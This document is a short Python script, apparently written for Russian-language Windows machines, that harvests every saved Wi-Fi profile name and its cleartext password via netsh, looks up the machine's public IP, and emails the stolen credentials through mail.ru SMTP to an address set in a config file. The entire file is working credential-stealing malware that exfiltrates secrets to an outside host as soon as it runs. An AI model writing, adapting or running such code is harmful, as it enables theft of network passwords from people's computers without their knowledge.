import subprocess
import smtplib

import requests as requests

import config

from typing import List, Dict
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


def get_wifi_names() -> List[str]:
    result = subprocess.run('netsh wlan show profile', stdout=subprocess.PIPE, shell=True, encoding='cp866')
    my_out = result.stdout.split(':')

    for x in range(0, 2):
        my_out.pop(0)

    return ''.join(my_out).replace('Все профили пользователей', '').replace(' ', '').split()


def get_wifi_pass() -> Dict[str, str]:
    keys_dict: Dict[str, str] = {}
    for item in get_wifi_names():
        result = subprocess.run(f'netsh wlan show profile name="{item}" key=clear', stdout=subprocess.PIPE, shell=True, encoding='cp866').stdout.replace(':', '').split()
        for x in range(0, len(result)):
            if result[x] == 'ключа':
                keys_dict[item] = result[x + 1]
                break

    return keys_dict


def get_ip_addr() -> str:
    request = requests.get('http://myip.dnsomatic.com/').text
    return request


def send_keys_by_email():
    msg: MIMEMultipart = MIMEMultipart()
    message: str = ''
    ip_addr: str = get_ip_addr()

    for key, value in get_wifi_pass().items():
        message += f'Имя сети: {key}, пароль: {value}\n'

    password: str = config.PASSWORD
    msg['From'] = config.FROM
    msg['To'] = config.TO
    msg['Subject'] = f'Пароль сети пользователя: {ip_addr}'

    msg.attach(MIMEText(message))

    with smtplib.SMTP_SSL('smtp.mail.ru', 465) as server:
        server.login(msg['From'], password)
        server.sendmail(msg['From'], msg['To'], msg.as_string())


if __name__ == '__main__':
    send_keys_by_email()
